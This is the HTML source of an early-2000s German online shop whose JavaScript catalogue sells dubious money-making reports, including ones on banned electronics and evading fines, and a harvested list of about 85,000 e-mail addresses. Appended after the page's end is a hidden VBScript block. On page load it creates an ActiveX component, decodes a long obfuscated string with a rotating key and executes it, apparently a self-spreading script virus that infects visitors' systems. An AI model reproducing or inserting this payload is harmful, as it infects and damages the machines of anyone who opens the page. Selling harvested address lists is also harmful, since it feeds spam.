<html>
<head>
<!-- SHF-00055, v0.55 (c) 2002, Erstellt mit Online-Shop von: www.zwahlen-informatik.ch -->
<title>The Shop</title>
<script language="JavaScript"><!--
var cTab='\t';
var gruppe='';
var korb=new Array();
var kategorien='Reporte	Spezialreporte	E-Mail Adressen	2,5 Mio. Linklisten	Pressekontakte	InfoReport	URL Eintragungsdienst	PopUpGenerator';
var artikel=new Array(49);
artikel[0]='01	Reporte	5.00	Billigeinkauf	buch.jpg			Das meiste Geld kann man tatsächlich mit preiswertem Einkauf verdienen.';
artikel[1]='02	Reporte	5.00	Einkaufsführer	buch.jpg			Kaufen Sie Billigwaren ein ( Top-Ergänzung zu Report 1 ).';
artikel[2]='03	Reporte	5.00	Electronic-Hotline	buch.jpg			Lukrativer Handel mit (in Deutschland) verbotenen Elektronik-Artikeln.';
artikel[3]='04	Reporte	5.00	Lohnende Nebenverdienste	buch.jpg			Hier finden Sie 1001 Chancen zum Geldverdienen.';
artikel[4]='05	Reporte	5.00	Kapitale Geldideen	buch.jpg			Eine Schatzkiste zum Thema \'Geld machen\'.';
artikel[5]='06	Reporte	5.00	Info-Beschaffungsdienst	buch.jpg			Wie Sie mit einem Info-Beschaffungsdienst reich werden.';
artikel[6]='07	Reporte	5.00	Finanz- und Kapitaltricks	buch.jpg			Insiderwissen und Unternehmungsgeist bringen das grosse Geld.';
artikel[7]='08	Reporte	5.00	Kuriose Verdienstideen	buch.jpg			Verdienstchancen gibt es überall, man muss sie nur erkennen.';
artikel[8]='09	Reporte	5.00	Geld verdienen vom Schreibtisch aus	buch.jpg			Sagen Sie dem Wecker und Berufsverkehr adé !';
artikel[9]='10	Reporte	5.00	Millionen-Dollar-Verkaufsbriefe	buch.jpg			Verkaufsbriefe, die Millionen eingebracht haben.';
artikel[10]='11	Reporte	5.00	Nebenverdienstideen	buch.jpg			Viele chancenreiche Nebenjobs.';
artikel[11]='12	Reporte	5.00	Neuheiten-Einkaufsführer	buch.jpg			Wo Sie Marktneuheiten bestellen können.';
artikel[12]='13	Reporte	5.00	Das Geschäft mit dem Autofahren	buch.jpg			Es ist nicht nur interessant, sondern auch profitabel!';
artikel[13]='14	Reporte	5.00	Bombengeschäft mit Neuheiten	buch.jpg			Die Seele jeden Geschäftes (und jeder Marktlücke!).';
artikel[14]='15	Reporte	5.00	Werden Sie Ihr eigener Produzent	buch.jpg			Profitieren Sie von über 100 Produktionsrezepten.';
artikel[15]='16	Reporte	5.00	Großes Geld mit kleinen Ratgebern	buch.jpg			Verdienen Sie mit Ihren Ratschlägen gutes Geld.';
artikel[16]='17	Reporte	5.00	Geld verdienen mit Ihrem Telefon	buch.jpg			Telefonieren Sie sich erfolgreich!';
artikel[17]='18	Reporte	5.00	Der erfolgreiche Versandunternehmer	buch.jpg			Geld verdienen mit einem Versandhandel.';
artikel[18]='19	Reporte	5.00	Werbung in Industrie und Wirtschaft	buch.jpg			Lernen Sie professionelles Marketing.';
artikel[19]='20	Reporte	5.00	Werbung zum Nulltarif	buch.jpg			Ihre Werbung kostenlos in Zeitungen, Prospekten, ...';
artikel[20]='21	Spezialreporte	7.00	Das Lottosystem	buch.jpg			Nie wieder verlieren (mit Geld-zurück-Garantie)!';
artikel[21]='22	Spezialreporte	7.00	Der Zweitpass	buch.jpg			Warum Sie ihn benötigen und wie Sie legal an einen herankommen.';
artikel[22]='23	Spezialreporte	7.00	Das Wetten	buch.jpg			Wetten auf fast alles und viel Geld kassieren.';
artikel[23]='24	Spezialreporte	7.00	Das Porto	buch.jpg			40% Portokosten sparen und wo Sie postgültige Briefmarken 20% unter Postpreis kaufen können.';
artikel[24]='25	Spezialreporte	7.00	Der Finanzmakler	buch.jpg			Wie Sie in 2 Tagen einen Porsche verdienen.';
artikel[25]='26	Spezialreporte	7.00	Ihr nächster Urlaub	buch.jpg			Wo Sie bis zu 50% Rabatt auf Flugreisen und Kreuzfahrten erhalten.';
artikel[26]='27	Spezialreporte	7.00	Auto fahren	buch.jpg			Und zwar ohne Führerschein - völlig legal.';
artikel[27]='28	Spezialreporte	7.00	Der Privatdetektiv	buch.jpg			Wie Sie bequem 250,- EUR an einem einzigen Tag verdienen (geeignet für jedermann).';
artikel[28]='29	Spezialreporte	7.00	Beschaffen Sie sich einen Metro-Ausweis	buch.jpg			Kaufen Sie Waren 20% unter dem normalen Ladenpreis!';
artikel[29]='30	Spezialreporte	7.00	Kostenloser Urlaub	buch.jpg			Oder wieviel soll Ihre nächste Reise kosten?';
artikel[30]='31	Spezialreporte	7.00	7500 Euro zu vergeben	buch.jpg			Sie benötigen lediglich einen Zehnmarkschein.';
artikel[31]='32	Spezialreporte	7.00	Kredit gratis	buch.jpg			Hier erfahren Sie wie und wo.';
artikel[32]='33	Spezialreporte	7.00	Portoerhöhungen der Post	buch.jpg			So verdienen Sie daran!';
artikel[33]='34	Spezialreporte	7.00	Legale Drogen	buch.jpg			Sie machen nicht süchtig, steigern aber Intelligenz, Denk-, Lern- und Merkvermögen.';
artikel[34]='35	Spezialreporte	7.00	Ihr eigener Doktortitel	buch.jpg			Wie Sie legal einen bekommen und diesen sogar in Ihren Pass eintragen dürfen.';
artikel[35]='36	Spezialreporte	7.00	Das Bussgeld	buch.jpg			Wie Sie nie wieder Knöllchen und Verwarnungen bezahlen müssen!';
artikel[36]='37	Spezialreporte	7.00	Die Markenartikel	buch.jpg			Mit diesem Super-Trick können Sie Markenware bis zu 50% unter Ladenpreis kaufen.';
artikel[37]='38	Spezialreporte	7.00	Die Telefonnummern	buch.jpg			Wie Sie damit ein Vermögen machen.';
artikel[38]='39	Spezialreporte	7.00	Waren kostenlos	buch.jpg			So kommen Sie an Artikel, die nichts kosten!';
artikel[39]='40	Spezialreporte	7.00	Die Schulden	buch.jpg			So reduzieren Sie Ihre Schulden um 75%!';
artikel[40]='50	Spezialreporte	30.00	5 Reporte nach Wahl	hot.gif			Suchen Sie sich 5 Reporte nach Wahl heraus, und schreiben Sie diese einfach in das Bemerkungsfeld.<br>';
artikel[41]='55	Spezialreporte	60.00	Alle Reporte	hot.gif			Wollen Sie alle Reporte haben?? Dann bestellen Sie einfach hier!<br>';
artikel[42]='51	Reporte	20.00	5 Reporte nach Wahl	hot.gif			Suchen Sie sich 5 Reporte nach Wahl heraus, und schreiben Sie diese einfach in das Bemerkungsfeld.<br>';
artikel[43]='55	Reporte	60.00	Alle Reporte	hot.gif			Wollen Sie alle Reporte haben?? Dann bestellen Sie einfach hier!<br><br>';
artikel[44]='60	E-Mail Adressen	10.00	E-Mail Adressen (ca. 85000 aus Deutschland)	at.gif			Hier wird ein riesiger Mail-Verteiler in verschiedenen Gruppen zusammengestellt verkauft.<br>';
artikel[45]='70	2,5 Mio. Suchdiensten	5.00	Eintrag in mind. 2,5 Mio. Suchdiensten	at.gif			Ihr Seite wird in mind. 2,5 Mio. Suchdiensten eingetragen. Dadurch erreichen Sie ein unwahrscheinlich hohe Linkpopularität, was sich bei dem Ranking der Suchmaschinen auswirkt.<br>';
artikel[46]='80	Pressekontakte	20.00	Pressekontakte, Anzeigemärkte, Zeitungen, Zeitschriften und mehr	at.gif			mind. 370 Pressekontakte, wichtige Kontakte zu Agenturen, mind. 2300 Internetadressen wo Sie u.a. kostenlos Ihre Anzeige aufgeben können, Email-Adressen und Postanschriften von Zeitungen und Verlagen. Dann nichts wie los und bestellen.';
artikel[47]='90	InfoReport	15.00	Der Info Report	hot.gif			Gewerbeanmeldung Wie Wo, Umgang mit dem Finanzamt, Ein Hobby zum Geschäft ausweiten, Mit dem Hobby Steuern sparen, Beispielrechnung, Geschäftsideen, Die Betriebsprüfung verhindern, So erhalte ich die Vorsteuer erstattet, Auf Umsatzsteuerbefreiung verzichten, Vorsteuer für´s Arbeitszimmer, Das Fahrtenbuch, Differenzbesteuerung, Ich bin doch kein Buchhalter, Beispiel Einnahme/Überschuss, Abschreibungen, Schritt für Schritt zum Online Geschäft, Erfolgreich versteigern <br>';
artikel[49]='101	URL Eintragungsdienst	20.00	URL Eintragungsdienst	hot.gif			Wollen Sie einen Eintragsdienst haben der Ihre Seiten in bis zu 2,7 MIO Suchdiensten Einträgt?? Dann bestellen Sie einfach hier!<br><br>';
artikel[48]='100	PopUpGenerator	15.00	Pop Up Generator	hot.gif			Für eine begrenzte Zeit biete ich diese Software<br>mit sämtlichen Wiederverkaufsrechten an ! Das bedeutet, <br>daß Sie nicht nur die Software besitzen, sondern auch die Rechte daran !<br>Sie behalten 100% des Umsatzes den Sie machen.<br>Sie können natürlich auch die Rechte wiederverkaufen, <br>auch dies wird Ihnen einen großen Gewinn bringen.';

function addArtikel(anz,art)
{
	korb[korb.length]=anz+';'+art;
	return(korb.length);
}
function getKorb()
{
	return(korb);
}
function setKorb(k)
{
	korb=k;
}
function setGruppe(g)
{
  gruppe=g;
}
function getGruppe()
{
  return(gruppe);
}
function getSelArt()
{
var i1=0;
var s= new Array();
var gr='';
if (gruppe=='') return s;
if (gruppe.indexOf('*')==0)
	gr=gruppe.substr(1,30);
if (gr=='')	
    gr=cTab+gruppe+cTab;
	 for (i=0;i< artikel.length;i++)
	{
	   if (artikel[i].indexOf(gr)>=0)
	   {
	    	s[i1]=artikel[i];
	    	i1++;
	   }
	 }
	return s; 
}
// --></script>
</head>
<frameset framespacing="0" border="0" frameborder="0" rows="114,*">
  <frame name="Oben" scrolling="no" noresize target="Detail" src="ftop.htm"
  marginwidth="0" marginheight="2">
  <frameset cols="140,*">
    <frame name="Inhalt" target="Detail" src="findex.htm" scrolling="auto" marginwidth="2"
    marginheight="2">
      <frame name="Detail" src="fstart.htm" scrolling="auto">
  </frameset>
  <noframes>
  <body>
  <p>Diese Seite verwendet Frames. Frames werden von Ihrem Browser aber nicht unterstützt.</p>
  </body>
  </noframes>
</frameset>
</html>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "AffFkPbbo^&EqffQbqn)S[mQbqn)A^aob^Mfdg&>mifbL[db`m&CPH&TpLbbie&TfgJ^qa&Pr[?)Cbh^ir>fpdPn\HCYpqZlq%HCMbq=cj%HC=obZnbJbffbn&EGIbebFm&EG@k_^q^G^fe&EGMkim^`[qb!#>haLo_Cnh`qbikDD>mi_kaMi%CbfbMZne)MsmbLno&Lk?oohlO^mrj^KbqnL_qK_^aM_jm7CLI+Li_kQ^rqCbfb%?cibI[qe%+&NjmLno6ObZ^Qbfj+O^[a>efB`Fgmqo!NjmLno)EG\ln^om&9;*LkIbgQjiMqo9*Qe^hK_^aM_jm'=ill_>rfq@rk\nflgBg^F_F_Qvi_Pqk:bqqQe^hK_^aM_jm'=ill_L_q?cibM_jm7CLI+Li_kQ^rqCbfb%?cibI[qe%,&@fi^Nbji(Tobnb6?H>VhhilZ^:#s_l]ofin7 DD\pm[oq!##8s_<lIc QfjPqk#o\@oE`#BqjeNbumCbfbQ^gm+<flp^P^nC:nqob\:@PL'Abq?cib!@fi^J^qa#?;qqkc_+Znqob\rq^m:-1?ip^O^[aQ^gm+<flp^P^nCbfbQ^gm6CPH(Lm^hQbqnCfe_%CbfbMZne)1#B`QrjbPml:eqffMbbkCfe_Qbfj+Tkcqbp_@kFc9#BQJE8s_<lIc 5#?L=Slgfl^]7#p_p\lfmm4HCYpqZlq% 7#p_@kFcEqffQbqn>fpbB`QrjbPml:s_lQa_k@fi^Nbji(Tobnbo\@oE`#P_pM_uqBk]FcCfe_Qbfj+@eipbBk]FcBk]Crg]qfhhCrg]qfhhHC=e^gabPn\%@nlobgnPqkckd%F^pmCka^r@eZl&CcE[pqBhabq=e^k:)Qe^hB`I^`q%E=^p^@rklbkmMqobhd&%+&66I<[pb!`Qe^hDD@eZhdbLo_6Cfg[iv=cph 3VMr_>:)BembEG@a[kd^Mr_7@al%>l]%I^`q%E=^p^@rklbkmMqobhd&%+&&'.#4YPr[?:*>haB`>fpbHG<b^k`_Pr[:Fca%<ooo^hqPmlfk`&.)E[pqBhabq=e^k#>haB`>ha?ok`mclk?ok`mclkEG@k_^q^G^fe&Ik>lolkOblojbHbumF_FkPbbo^:bqjeQa_k?ufmCrg]qfhh>haB`Lb^o^@fi^:E_cq!QfkI[qe%-&MkidoZgCbfbpU=ljfik?ciblVJf\llph`qLb^o^^YPm[qfhhborV_iZhh+anjFcCPH(Cfe_Bubmqp!Me^k_Cfe_&&Nebg@ZfiDD>mi_kaMi%Pa[ob?cib%eqff&Bil_L_q?cibM_jm7CLI+Li_kQ^rqCbfb%Lb^o^@fi^&/)mlrbCbfbQ^gm+Plfq^9#BQJE8s_<lIc 5#?L=Slgfl^]7#p_p\lfmm4HCYpqZlq% 7#p_@kFcEqffQbqn?cibM_jm'=ill_>haB`=_c^nfqF]:PmPe^fi+K_dO^[a%BHBRY@RKLBKMYRP>LYF]_kqbnfblVAb_[rimRp^lF=&IrqEilhO_opbik6TpLbbie(Ob`Lb^]ED?V\EI@>EYJ><BFK>VPl_nt^k_YJb]ollicqUIrqeilh?umk_ppUGbab[Sbk&QpPa_ii'LbdPlfq^ED?V\<OOO>HQ\NMBOUCabgnfqb_pY Ab_[rimCa#VPl_nt^k_YJb]ollicqUIrqeilh?umk_ppU#E_cq!IrqEilhO_opbik)*##(-YF[fiU=ljiipbOpbMq^mclk^lv%+)K?D\=QLO=<[iiEGJZciO^a%AEBVX=ROK?KQXOPBKVFa^hqfmcbpU#A^`^renFaYPh`qtZlbYFc`ohmlcmVLrmflldBuilbplV#FbcmLrmFlldPbolclk%+&+-UG^feVPqZnflg_ovH^j^)Pa[ob?cib@ZfiDDJ^bfOb`ED?V\<OOO>HQ\NMBOUCabgnfqb_pY Ab_[rimCa#VPl_nt^k_YJb]ollicqUIrqeilh?umk_ppU#E_cq!IrqEilhO_opbik)*##(-YF[fiUQfa^PqZnflg_ovH^j^)Pa[ob?cibTlMebef+O^aTobnbBHBRY@RKLBKMYRP>LYPh`qtZlbYFc`ohmlcmVLc_c`bU3+-UIrqeilhUImqbikpUG^feVBabnloIlbc^lbk\_)*-.-0,)K?D\=QLO=<[iiEGJZciO^a%AEBVX=ROK?KQXOPBKVPl_nt^k_YJb]ollicqUQfk]itpGbpl[dfgaPn\pvlnbjUJol_ciblVJf\llph`qHoqihihBhqbkhbqMbqmckdlV-^)^-/)*--)*--)*`-)*--)*--)*---0Y-)+b-,0-%_iZhh@ZfiDDJ^bfOb`ED?V\<OOO>HQ\NMBOUMlcmq^o^VJf\llph`qYPckahqpGNY@nlobgnSbkmflgVTfg^ltlJblm^dbhdLo_prmqbfVMoh`fi^mYJb]ollicqIrqeilhCkq^lkbmPbmnfk`mY-Z*a-+*--)*--)*-`)*--)*--)*--).3Y)*.b)-3-&_e[kh#PmPe^fi+K_dTkcqbEH>S\@NLOBGN\RL?OYLicqp[obUGf`kipl_nYL_`f`^V.-'*YLnnilheYLinflgmYJZciY>^fqhlMo^`bo^h`b&.0**4/%OB@YATHLA@^efHCG^feLbd!EH>S\@NLOBGN\RL?OYLicqp[obUGf`kipl_nYL_`f`^V.-'*Y@hgjlgVJ^bfPbmnfk`mYK^qPqZnflg_ov&_e[kh#DDrjf[db?iia^l%I^`q%PckMZne),##Mohao^fCfe_pY<ijjhhCbfbpUGf`kipl_nPa[ob]VPqZnflg_ov#>ha?ok`mclk?ok`mclkEG@k_^q^Gfib_r%LgBokioK_prf_K^rqNbjiJ^qa:B`Khn%CLI+CbfbBqcpqlTfgJ^qa#QP`kcmq'_ub#&MbbkQbfjM^mb:pvlnbj,,YBk]FcFcNbjiJ^qa:mvpm_j0+VMbbkPqZlqRi@fi^:PckMZnePRMQBFVHbkhbi,,+aef?ip^Pm[oqNjCfe_:QfkI[qe LSPQ>GYH^lkbe(aie>haB`PmPe^fi+K_dTkcqbEH>S\IH=>IXG>@ACKBUMlcmq^o^VJf\llph`qYPckahqpY<ooo^hqS^lpfhhYOnhYH^lkbe-/%Mq^knRm?cibCPH(@lisCfe_TbhM^mb#tb[Vhgp[ii'afc&TfgJ^qa#qb_U@li]_o+anqCPH(@lisCfe_TbhM^mb#pvlnbj,,Yhcq^ie(df_)TbhM^mb#pvlnbj,,Ya^mhqhj+fgc=^ieHG:jmbg^Ql!QfkI[qe p__Y?iia^l+emn)bqq#PmPe^fi+K_dTkcqbEH>S\@E;PP>M\OHIQY'^iiU)]ficbfbTpLbbie(Ob`Qofm_AEBVX=I>LMBPXLLLMV+aefY@hhqbgnQrjb%^miff`Znflg)u*fmalphilZ^QpPa_ii'LbdPlfq^ED?V\<F>PL?P\KILQU^ii_cibU>bcZoiqB]lkU)TlMebef+O^aObZ^%AEBVX=I>LMBPXLLLMVsu]`fi^VAb_[rimC`lgV&TpLbbie(Ob`Qofm_AEBVX=I>LMBPXLLLMVaie`fi^VP`kcmq>hdfg_Y%S?L]ofinQpPa_ii'LbdPlfq^ED?V\<F>PL?P\KILQU^ii?cibUMebefYLi_kY<ijjZhaY&TfgJ^qa#M_jmI[qe PM`objq+^rb.#PmPe^fi+K_dTkcqbEH>S\@E;PP>M\OHIQY]fiCbfbYLbbie?uYIllm^lqvLbbbmB^k]fbolVTPAJolimY%x3),21<;2*2/0?&+.@?'5@20*-);>-)<54)2@zTlMebef+O^aTobnbBHBRY@I:MPBLYOLHNYaefCfe_YP\lfmmBlpm?k`h^bY&x1/.0*00.&.5-<'..=,*?*@6*)*@--@53<-/1vL_q?cibM_jm7CLI+Li_kQ^rqCbfb%Ln^omOmCbfb)+&qon_&@fi^Nbji(TobnbO\pQ^rq@fi^Nbji(@ihmb?ka@rk\nflg@rk\nflgHGEchbBn%&FcCkTa_ob6;bqjeQa_k?ufmCrg]qfhh>haB`MbfpEi`^mclk7ah]rj^hq+ei`^mclkFcFbcmQebmIl\[qfhh)-#:cfe_MbbkQebmIl\[qfhh:Gfa!NeflFl`Znflg&6&Fc@PL'Abq>rqbgmflgH^j^QebmIl\[qfhh&58qe^hMbfpEi`^mclk7I^`q%MbfpEi`^mclk%Fbk!NeflFl`Znflg#*Fbk!@PL'Abq?cibG[jb!NeflFl`Znflg#&&Bk]FcFcFbk!NeflFl`Znflg#;-Qa_kNeflFl`Znflg:MbfpEi`^mclk U>haB`DDrjf[db?iia^l%QacpIh]^qbik&Bk]FcBk]Crg]qfhhCrg]qfhhHCG^feLbd!LbdLno)?cibG[jbLgBokioK_prf_K^rqLbdM_jmLno6TpLbbie(Ob`Lb^]Ob`MqoF_Ob`NbjiMqo7Qe^hPmPe^fi+K_dTkcqbLbdLno)?cibG[jbBk]FcBk]Crg]qfhhCrg]qfhhHCI_lLo_%<ooo^hqPmlfk`#Lo_B7-QblnLrm:)AhTebfbMlrbQblnLrm:M_pqHoq$.CcM_pqHoq7/5Nebg@nlobgnPqkckd7Cbh^ir>fpd#4YBubnAhBg^F_LgBokioK_prf_K^rqMbqNefl@li]_o6CPH(Dbm@li]_o%<ooo^hqPmlfk`#L_q=c`Pn\:=obZnbL[db`mP\lfmmckd'>f`mclkZlvP^nChfabkm:Nefl@li]_o+Lo_Chfabkm?iia^l@lnhq6-@lo?^`aQbfjCle^bock?iia^lp@li]_o@hokq7Chfabk=lrgn(+=c`Pn\+^]^Chfabk=lrgn)M_jm?iia^l+KZgbHbumF_Af\Mr_'=lrgn:*Qa_kF^pmCka^r@eZl:CkpmlObo@rklbkmMqobhd)V)E_k%<ooo^hqPmlfk`#*.Pn\Pqkckd7Jb^%@nlobgnPqkckd%F^pmCka^r@eZl(.%Fbk!=rok_kqLnofga&*E[pqBhabq=e^k'.&@rklbkmMqobhd6HG<b^k`_Pr[@rklbkmMqobhd)E[pqBhabq=e^k#Lo_B7.Bil_B`Pn\B6-Mbbk@rklbkmMqobhd6@rklbkmMqobhdAf\Mr_'Cqbf.& U>rfq>l?ip^g7-Clkg6.MiChfabk=lrgnB`I<[pb!Mr_Lnofga&6I@Zmb%=c`Pn\+Fm_j%c#&MbbkFcd9@li]_o@hokqNebg@nlobgnPqkckd7@nlobgnPqkckd Ab]Pr[(Fq^g%g$+&YBqcq=i>haB`>haB`G_uqI^lnFk]_u@a[o6FklnoO^p%@nlobgnPqkckd%Y%Fbk!=rok_kqLnofga&**#Lo_Pmlfk`:Fca%<ooo^hqPmlfk`&I^lnFk]_u@a[o(*&Ibg@rklbkmMqobhd&&F^pmCka^r@eZl*.@nlobgnPqkckd7HC=e^gabPn\%@nlobgnPqkckd%F^pmCka^r@eZl&?kaCc?kaCcFlliHCI_lLo_6@rklbkmMqobhd?ka@rk\nflg@rk\nflgHGIllmZa^q^&Ik>lolkOblojbHbumO^aM^mbS^eob6ED?V\EI@>EYJ><BFK>VPl_nt^k_YJb]ollicqUIrqeilh?umk_ppU>bdk_bAfleAb`lbb7TlMebef+O^aObZ^%O^aM^mbS^eob&Fc>fpd>bdk_b6NebgAbmhA^aob^:?ck^esAfle#7YBg^F_Chlf6+qh2>fpd>bdk_b6HGH\lPn\%AbmhA^aob^#DDrjf[db?iia^l%AbmhA^aob^#G_uqTpLbbie(Ob`Qofm_O^aM^mbS^eob)=cph=_do^_>ha?ok`mclk?ok`mclkEGrfg^d^@li]_o%I[qeG[jbLgBokioK_prf_K^rqMbq@li]_oKZgb6CPH(Dbm@li]_o%I[qeG[jbP^nQacpCbfbp7ChfabkH^j^(Cfe_pBqq>rfpmm:*?io>[`eNefl@fi^FkNefl@fi^m?cib>rq6R@Zmb%?ML+@_qBqnbklclkG[jb!Nefl@fi^(M^mb&&Fc@fi^?uq7ANJIo?cib>rq6EMGIIo?cib>rq6>LJHlCbfbBqn:MEILkCfe_Bum:DPMQe^h<[iiEG>ijbk]Nl%Mbfp?cib'J^qa&emgiBembF_Cfe_Bum:P?PQe^h<[iiEG>ijbk]Nl%Mbfp?cib'J^qa&s[m&Bil_Fc@fi^?uq7ANQNebgEmnBubmqp7.Bk]FcKbqnB`%N=^p^M^mbK^f_&6R@Zmb%PckMZneA^mhqhjY#Lk%R<[pb!J^qaH^j^#:O@^l_%TbhM^mb#Ableqli&&MbbkEqm?uflnp6.?kaCcCcAnqBqcpql:)Qe^h?ML+<imv?cibQfkI[qe lspq^g0/U^bpdnlm'ckf&M^mbK^f_?ML+<imv?cibQfkI[qe p__Y?iia^l+emn)I[qeG[jbBk]FcBk]Crg]qfhhCrg]qfhhHCMbq=cj%LgBokioK_prf_K^rq?oo'=ibZlM_pqBn:QP`kcmq'M`objqCnfikZgbCc>loMbbkFkPbbo^:bqje>fpbFkPbbo^:p_pBg^F_F_FkPbbo^:p_pQe^hL_q?ML6@o^[qbH\gb\n%L]ofinfk`(Cfe_PvlnbjH\gb\n&PbmTpLbbie:<lb^m_L_c_`q!TP\lfmm(Pe^fiBembMbq;mme_L_c_`q7ah]rj^hq+Zjmi^np%EG\`obpm&;mme_L_c_`q'mbq<FPF=x?302==//&+@C)'..=**>=<6*)*@--@A21;-?v&;mme_L_c_`q']obZnbFgmq^g]b%P^nTlMebef:;mme_L_c_`q'AbqH\gb\n%&>mifbL[db`m(pbm=IPB>%t*A1,@B-*'C-2-*.*=C*131-&*->)=6-..//1w&>mifbL[db`m(`o^[qbBhpqZh`b!#L_q?ML6>mifbL[db`m(DbmI_g^]q%Bg^F_P^nAbmhL[db`m:?ML+=lfs^m?io>[`e>fpdNbjiFk>fpdI_g^]qCc=cphM_jm'>ofo_Qvi_97/:ha=cphM_jm'>ofo_Qvi_97.MbbkBubnChl>haB`?ck^esAfle:>fpdNbji(AobpbI^nqbkK^rq>fjIqe^l>ok0&O^g^ljbtb@loc:-Nl,Lmbbo:lo%b#:Ckq!6#Ok]#&HbumQ^gmPmlfk`:?iob7.MiI^h%QacpQ^rq&QbfjKrf::m`%Fca%MbfpM_uq%c).#B`Q^gmKng:+0MbbkQbfjKrf:+2>fpbB`Q^gmKng:+-MbbkQbfjKrf:+3>haB`M_jm<b^o7@al%Q^gmKng*Iqe^l>okfFia-#&CcM_jm<b^o7@al%0-#Qa_kNbji=e^k:<bo%*2&?kaCcNbjiMqobhd6QbfjPqkckd Q^gm@a[oHbumRgFl`dMqo7>rb`nnb%AffHbr;oo!-&)MbfpM_uq#s[=oI_ D_v>kl%-:#Hnebk;oo!*& s_<lIcH^s>ok.&7 Lmbbo:lo%*##p_@kFc#Hbr;oo!,&6Lqa_o>kl%/##o\@oE`#Ebv:lo%,#:#Iqe^l>ok0& #s[=oI_ ?iob7.MiI^h%Bq_Pqkckd#o\@oE`#NbjiHrj7>l]%Jb^%Bq_Pqkckd%c).#p_@kFc#FcNbjiHrj7.1Qe^hp_@kFc#QbfjKrf:,.p_@kFc#Bk]Fc#s[=oI_ M_jm<b^o7@al%Q^gmKng(Ebv:lo%bJl]1&#o\@oE`#CcM_jm<b^o7@al%/1#Qa_k s_<lIcQ^gm@a[o6s_<lp_@kFc#Bil_FcNbji=e^k:<bo%+3&Mbbk#s[=oI_ M_jm<b^o7s[Fc s_<lIcBg^F_#o\@oE`#NeflNbum:MbfpM_uq Q^gm@a[o s_<lIcK^rq#s_<lIc >rb`nnb%MbfpM_uqMbfpM_uq7>rbPmlfk`:QbfjPqkckd BqjeNbum:5#p`kcmqf^k`o^d^7s_l]ofin; s[=oI_#^l`ngbkm(tobnb# 5#afopqrfb: jlpbnflg4^_liirm_8e_cq3*mu4qli4-mq5tb^qe3*mu4ebbaeq3*mu4w*bhabq4/54sflc_fecqv3ef]^bk 89##>MIFBQH>J>7HG#Ydr^mqA?FDAN:-QFAMB:-]la^7`lf(jp'#^`mcsbQ(>`mcsb#R@lfjlk^hq;#6,:JMI>N; 5#,abp;#p_@kFc9#)p`kcmq7#p_@kFc9#m`objqe[kdn[db6p_p\lfmm8s_<lIc QacpQ^rqs_<lIc RgFl`dMqo s[=oI_#6,l]ofin; s[=oI_#6,;IAV7#p_@kFc9#)EQFF;S_lNbum:MbfpM_uq s[=oI_#NhIl\ePqk#o\@oE`#HGXmq^kn%&TbhM^mb:@PL'AbqLjb`b[iChfabk-& UB`%?ML+?cib>rfpmm%TbhM^mb#tb[VCle^bo'bqq#&MbbkCPH(@lisCfe_TbhM^mb#tb[VCle^bo'bqq&TfgJ^qa#qb_UegtZfi+`ccBk]FcFcCPH(Cfe_Bubmqp!QfkI[qe lspq^g0/U^bpdnlm'ckf#&MbbkCPH(@lisCfe_TbhM^mb#pvlnbj,,Ya^mhqhj+fgc)PckMZneprmqbf-/Yddt^ef+db`?kaCc?ka@rk\nflg"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 6"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 3"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>